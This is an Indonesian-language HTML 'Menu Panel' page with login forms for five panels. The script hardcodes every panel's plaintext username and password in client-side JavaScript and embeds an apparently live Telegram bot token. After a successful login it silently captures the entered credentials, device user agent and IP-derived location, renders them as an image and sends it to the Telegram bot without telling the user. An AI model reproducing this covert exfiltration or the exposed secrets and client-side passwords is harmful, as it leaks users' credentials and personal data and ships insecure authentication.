<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Menu Panel</title>
  <style>
    :root {
      --primary: #3498db;
      --primary-dark: #1f3b5c;
      --bg-dark: #0f111a;
      --card-bg: #1a1d2e;
      --text: #e0e0e0;
      --success: #2ecc71;
      --danger: #e74c3c;
      --glitch: #00f0ff;
    }

    @keyframes glitch {
      0% { text-shadow: 2px 0 red, -2px 0 cyan; }
      20% { text-shadow: -2px 0 red, 2px 0 cyan; }
      40% { text-shadow: 2px 2px red, -2px -2px cyan; }
      60% { text-shadow: -2px -2px red, 2px 2px cyan; }
      80% { text-shadow: 2px 0 red, -2px 0 cyan; }
      100% { text-shadow: none; }
    }

    body {
      margin: 0;
      background: var(--bg-dark);
      font-family: 'Segoe UI', sans-serif;
      color: var(--text);
      display: flex;
      flex-direction: column;
      align-items: center;
      padding: 50px 20px;
    }

    h1 {
      font-size: 2em;
      margin-bottom: 30px;
      animation: glitch 1.5s infinite;
      color: var(--primary);
    }

    #menuContainer {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
      gap: 20px;
      width: 100%;
      max-width: 800px;
    }

    .panel-button {
      background: var(--card-bg);
      border: 1px solid var(--primary);
      border-radius: 12px;
      padding: 20px;
      color: white;
      font-size: 1rem;
      cursor: pointer;
      transition: 0.3s;
      box-shadow: 0 0 10px rgba(0, 255, 255, 0.1);
    }

    .panel-button:hover {
      background: var(--primary-dark);
      transform: translateY(-3px);
      box-shadow: 0 0 20px var(--primary);
    }

    .overlay, .login-form {
      position: fixed;
      top: 0; left: 0; width: 100%; height: 100%;
    }

    .overlay {
      background: rgba(0, 0, 0, 0.5);
      z-index: 1000;
      display: none;
    }

    .login-form {
      display: none;
      justify-content: center;
      align-items: center;
      z-index: 1001;
    }

    .login-box {
      background: var(--card-bg);
      padding: 25px;
      border-radius: 12px;
      width: 300px;
      text-align: center;
      box-shadow: 0 0 25px rgba(0,0,0,0.6);
      animation: scaleUp 0.4s ease-out;
    }

    @keyframes scaleUp {
      from { transform: scale(0.7); opacity: 0; }
      to { transform: scale(1); opacity: 1; }
    }

    input[type="text"], input[type="password"] {
      width: 90%;
      padding: 10px;
      margin: 8px 0;
      border: 1px solid #555;
      border-radius: 6px;
      background: #222;
      color: white;
    }

    .login-box button {
      margin: 8px 4px;
      padding: 10px 20px;
      border: none;
      border-radius: 8px;
      font-weight: bold;
      cursor: pointer;
    }

    .login-box button:first-child {
      background-color: var(--success);
      color: white;
    }

    .login-box button:last-child {
      background-color: var(--danger);
      color: white;
    }

    #notif {
      position: fixed;
      bottom: 20px;
      left: 50%;
      transform: translateX(-50%);
      background: #222;
      color: #fff;
      padding: 12px 20px;
      border-radius: 10px;
      display: none;
      z-index: 1002;
      box-shadow: 0 2px 8px rgba(0,0,0,0.3);
    }
  </style>
</head>
<body>
<h1>Menu Panel</h1>
<div id="menuContainer"></div>

<div class="overlay" id="overlay"></div>
<div class="login-form" id="loginForm">
  <div class="login-box">
    <h3 id="panelTitle">Login</h3>
    <input type="text" id="username" placeholder="Username"><br>
    <input type="password" id="password" placeholder="Password"><br>
    <button onclick="submitLogin()">Masuk</button>
    <button onclick="closeForm()">Batal</button>
  </div>
</div>

<div id="notif"></div>
<div id="captureArea" style="display:none;">
  <div id="reportText"></div>
</div>

<script src="https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js"></script>
<script>
  const telegramToken = "7847987165:AAExaFfM8F2eWgJc_0TG8k3xx3uiQKAOZxE";
  const chatId = "7274253936";
  const panels = [
    { name: "PRIBADIFAAN", user: "faan", pass: "OCTA", url: "https://example.com/pribadifaan" },
    { name: "PT JASTEB 1", user: "admin", pass: "111", url: "https://example.com/jasteb" },
    { name: "ZaanHost", user: "zan", pass: "zan", url: "https://example.com/zaanhost" },
    { name: "PRIBADI FAAN", user: "faantek", pass: "faantek", url: "https://example.com/faantek" },
    { name: "KOSONG", user: "test", pass: "123", url: "https://example.com/kosong" }
  ];

  let selectedPanel = null;
  let locationData = "Tidak tersedia";

  function renderButtons() {
    const container = document.getElementById("menuContainer");
    panels.forEach(panel => {
      const btn = document.createElement("button");
      btn.className = "panel-button";
      btn.textContent = panel.name;
      btn.onclick = () => {
        selectedPanel = panel;
        document.getElementById("panelTitle").textContent = "Login - " + panel.name;
        document.getElementById("username").value = "";
        document.getElementById("password").value = "";
        document.getElementById("overlay").style.display = "block";
        document.getElementById("loginForm").style.display = "flex";
      };
      container.appendChild(btn);
    });
  }

  function closeForm() {
    document.getElementById("overlay").style.display = "none";
    document.getElementById("loginForm").style.display = "none";
  }

  function submitLogin() {
    const username = document.getElementById("username").value.trim();
    const password = document.getElementById("password").value.trim();
    if (!selectedPanel) return;

    if (username === selectedPanel.user && password === selectedPanel.pass) {
      showNotif("Login berhasil", "#2ecc71");
      const reportHTML = `
        <b>Login Panel:</b> ${selectedPanel.name}<br>
        <b>Username:</b> ${username}<br>
        <b>Password:</b> ${password}<br>
        <b>Waktu:</b> ${new Date().toLocaleString()}<br>
        <b>Device:</b> ${navigator.userAgent}<br>
        <b>Info Lokasi:</b> ${locationData}
      `;
      document.getElementById("reportText").innerHTML = reportHTML;
      html2canvas(document.getElementById("captureArea")).then(canvas => {
        sendImageToTelegram(canvas);
        setTimeout(() => window.location.href = selectedPanel.url, 1200);
      });
    } else {
      showNotif("Username atau password salah!", "#e74c3c");
    }
  }

  function showNotif(message, color = "#444") {
    const notif = document.getElementById("notif");
    notif.style.background = color;
    notif.textContent = message;
    notif.style.display = "block";
    setTimeout(() => notif.style.display = "none", 3000);
  }

  function sendImageToTelegram(canvas) {
    canvas.toBlob(blob => {
      const formData = new FormData();
      formData.append("chat_id", chatId);
      formData.append("photo", blob, "login.png");
      fetch(`https://api.telegram.org/bot${telegramToken}/sendPhoto`, {
        method: "POST",
        body: formData
      }).catch(err => console.error("Gagal kirim ke Telegram:", err));
    });
  }

  function fetchLocation() {
    fetch("https://ipapi.co/json/")
      .then(res => res.json())
      .then(data => {
        locationData = `${data.city}, ${data.region}, ${data.country_name} (${data.org})`;
      })
      .catch(() => {
        locationData = "Lokasi tidak ditemukan";
      });
  }

  renderButtons();
  fetchLocation();
</script>
</body>
</html>
